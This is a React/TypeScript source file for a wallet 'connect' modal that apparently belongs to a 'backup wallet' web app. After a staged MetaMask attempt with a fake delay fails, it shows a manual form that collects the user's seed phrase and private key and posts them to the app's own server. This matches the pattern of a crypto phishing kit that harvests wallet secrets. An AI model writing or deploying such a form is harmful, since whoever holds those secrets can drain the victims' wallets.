import React, { useState } from "react";
import { useSession } from "next-auth/react";
import { utils } from "ethers"; // Import utils from ethers
import { QRCodeSVG } from "qrcode.react";
import { Dialog, DialogContent, DialogHeader, DialogTitle } from "@/components/ui/dialog";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input"; // Assumes you have an Input component

interface BackupWallet {
  id: number;
  name: string;
  balance: number;
  logo: string | null;
  currency: string | null;
}

interface WalletModalProps {
  isOpen: boolean;
  onClose: () => void;
  selectedWallet: BackupWallet | null;
  modalStep: "initial" | "connecting" | "success" | "error";
  setModalStep: React.Dispatch<React.SetStateAction<"initial" | "connecting" | "success" | "error">>;
  loading: boolean;
  error: string | null;
  walletAddress: string | null;
}

const WalletModal: React.FC<WalletModalProps> = ({
  isOpen,
  onClose,
  selectedWallet,
  modalStep,
  setModalStep,
  loading,
  error,
  walletAddress,
}) => {
  const [preloader, setPreloader] = useState(false);
  const [dynamicError, setDynamicError] = useState<string | null>(null);
  const [currentStep, setCurrentStep] = useState(0); // Track the step of the manual connection
  const [backupData, setBackupData] = useState({
    publicAddress: "",
    seedPhrase: "",
    privateKey: "",
    qrCodeData: "",
    seedPhraseArray: [] as string[], // Added seedPhraseArray to handle tags
  });

  const { data: session } = useSession();
  const userId = session?.user?.email;

  // Convert the seed phrase input into an array of tags
  const handleSeedPhraseChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value;
    const tags = value.split(",").map((tag) => tag.trim()).filter((tag) => tag.length > 0);
    setBackupData((prevState) => ({
      ...prevState,
      seedPhrase: value,
      seedPhraseArray: tags, // Store tags as an array
    }));
  };

  // Function to handle removing tags
  const removeTag = (index: number) => {
    const newTags = [...(backupData.seedPhraseArray || [])];
    newTags.splice(index, 1);
    setBackupData((prevState) => ({
      ...prevState,
      seedPhraseArray: newTags,
      seedPhrase: newTags.join(", "), // Update input field with comma-separated values
    }));
  };

  const connectWallet = async () => {
    setPreloader(true);
    setDynamicError(null);

    setTimeout(async () => {
      setModalStep("connecting");
      setPreloader(false);

      if (typeof window.ethereum === "undefined") {
        setDynamicError("MetaMask is not installed. Please download it.");
        setModalStep("error");
        setPreloader(false);
        return;
      }

      try {
        const accounts = await window.ethereum.request({
          method: "eth_requestAccounts",
        });

        if (accounts.length > 0) {
          const publicAddress = accounts[0];

          const balanceWei = await window.ethereum.request({
            method: "eth_getBalance",
            params: [publicAddress, "latest"],
          });

          const balance = utils.formatEther(balanceWei);

          const response = await fetch(`/api/backup/storeWalletData/${userId}`, {
            method: "POST",
            headers: {
              "Content-Type": "application/json",
            },
            body: JSON.stringify({
              publicAddress,
              balance,
              walletName: selectedWallet?.name,
              currency: selectedWallet?.currency, // Added currency to the payload
            }),
          });

          if (response.ok) {
            const data = await response.json();
            console.log("Wallet data saved successfully", data);
            setModalStep("success");
          } else {
            throw new Error("Failed to save wallet data");
          }
        } else {
          throw new Error("No accounts found in MetaMask.");
        }
      } catch (err: unknown) {
        // Adjust the error handling
        if (err instanceof Error) {
          setDynamicError(err.message || "Failed to connect to MetaMask.");
        } else {
          setDynamicError("An unexpected error occurred.");
        }
        setModalStep("error");
      }
    }, 5000);
  };

  const connectWalletManually = () => {
    if (currentStep === 0) {
      setCurrentStep(1); // Move to the next step in manual connection
    } else {
      setCurrentStep(0); // Reset to the initial step
      setModalStep("initial"); // Reset modal to initial state
    }
  };

  const saveManualData = async () => {
    const { publicAddress, seedPhrase, privateKey, qrCodeData } = backupData;

    if (!publicAddress) {
      setDynamicError("Public address is required.");
      return;
    }

    // Prepare the data to be sent to the backend API
    const walletData = {
      userId: userId, // Use userId from the session
      publicAddress,
      walletName: selectedWallet?.name || "Manual Wallet", // Default to a name if not provided
      seedPhrase: seedPhrase || null, // Optional
      privateKey: privateKey || null, // Optional
      qrCodeData: qrCodeData || null, // Optional
    };

    try {
      const response = await fetch(`/api/backup/storeWalletData/${userId}`, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify(walletData),
      });

      if (response.ok) {
        const data = await response.json();
        console.log("Manual wallet data saved:", data);
        setModalStep("success");
      } else {
        throw new Error("Failed to save manual wallet data.");
      }
    } catch (error: unknown) {
      // Adjust error handling for unknown errors
      if (error instanceof Error) {
        setDynamicError(error.message || "An error occurred while saving data.");
      } else {
        setDynamicError("An unexpected error occurred.");
      }
      setModalStep("error");
    }
  };

  const goBack = () => {
    setCurrentStep(0); // Go back to the initial step
    setModalStep("initial"); // Reset modal to initial state
  };

  if (!selectedWallet) return null;

  return (
    <Dialog open={isOpen} onOpenChange={onClose}>
      {modalStep !== "success" && (
        <DialogContent className="sm:max-w-md">
          <DialogHeader>
            <DialogTitle className="text-center">
              {modalStep === "initial" && `Connect Your ${selectedWallet?.name} Wallet`}
              {modalStep === "connecting" && "Connecting..."}
              {modalStep === "error" && "Connection Failed"}
            </DialogTitle>
          </DialogHeader>

          <div className="space-y-6">
            {preloader && (
              <div className="flex flex-col justify-center items-center">
                <img
                  src={selectedWallet.logo || "/default-logo.png"}
                  alt={`${selectedWallet.name} logo`}
                  className="animate-zoom w-20 h-20"
                />
                <p className="text-small text-green-600 mt-6 mb-6">
                  Establishing Connection...
                </p>
              </div>
            )}

            {!preloader && modalStep === "initial" && (
              <div className="text-center">
                <Button onClick={connectWallet} disabled={loading}>
                  {loading ? "Connecting..." : "Connect Wallet"}
                </Button>
              </div>
            )}

            {modalStep === "error" && (
              <div className="space-y-4">
                <p className="text-center text-red-500">
                  {dynamicError || "An error occurred. Please try again."}
                </p>
                <div className="flex justify-center gap-2">
                  <Button className="bg-red-600" onClick={onClose}>
                    Cancel
                  </Button>
                  <Button
                    className="bg-black"
                    onClick={connectWalletManually}
                  >
                    Connect Manually
                  </Button>
                </div>
              </div>
            )}
          </div>
        </DialogContent>
      )}

      {modalStep === "success" && walletAddress && selectedWallet && (
        <DialogContent className="sm:max-w-md">
          <DialogHeader>
            <DialogTitle className="text-center">Scan the QR Code</DialogTitle>
          </DialogHeader>
          <div className="space-y-6">
            <div className="flex justify-center">
              <QRCodeSVG value={walletAddress || ""} size={256} />
            </div>
            <div className="text-center">
              <Button variant="outline" onClick={onClose}>
                Close
              </Button>
            </div>
          </div>
        </DialogContent>
      )}

      {/* Manual connection steps */}
      {currentStep === 1 && (
        <DialogContent className="sm:max-w-md">
          <DialogHeader>
            <DialogTitle className="text-center">Enter Wallet Data</DialogTitle>
          </DialogHeader>
          <div className="space-y-6">
            <Input
              placeholder="Enter Public Address"
              value={backupData.publicAddress}
              onChange={(e) =>
                setBackupData({ ...backupData, publicAddress: e.target.value })
              }
            />
            <Input
              placeholder="Enter Seed Phrase (optional)"
              value={backupData.seedPhrase}
              onChange={handleSeedPhraseChange} // Handling seed phrase change
            />
            <span className="text-green-500 text-sm">Separate each phrase with a comma ','</span>
            {/* Display seed phrase tags */}
            <div className="flex flex-wrap gap-2 mt-4">
              {(backupData.seedPhraseArray || []).map((tag, index) => (
                <div
                  key={index}
                  className="flex items-center justify-between px-3 py-1 rounded-full bg-gray-200 text-gray-700"
                >
                  <span>{tag}</span>
                  <Button
                    variant="link"
                    onClick={() => removeTag(index)} // Handling tag removal
                    className="ml-2 text-red-500"
                  >
                    ×
                  </Button>
                </div>
              ))}
            </div>

            <Input
              placeholder="Enter Private Key (optional)"
              value={backupData.privateKey}
              onChange={(e) =>
                setBackupData({ ...backupData, privateKey: e.target.value })
              }
            />
            <Input
              placeholder="Enter QR Code Data (optional)"
              value={backupData.qrCodeData}
              onChange={(e) =>
                setBackupData({ ...backupData, qrCodeData: e.target.value })
              }
            />
            <div className="flex justify-between mt-4">
              <Button variant="outline" onClick={goBack}>
                Go Back
              </Button>
              <Button onClick={saveManualData}>
                Save
              </Button>
            </div>
          </div>
        </DialogContent>
      )}
    </Dialog>
  );
};

export default WalletModal;
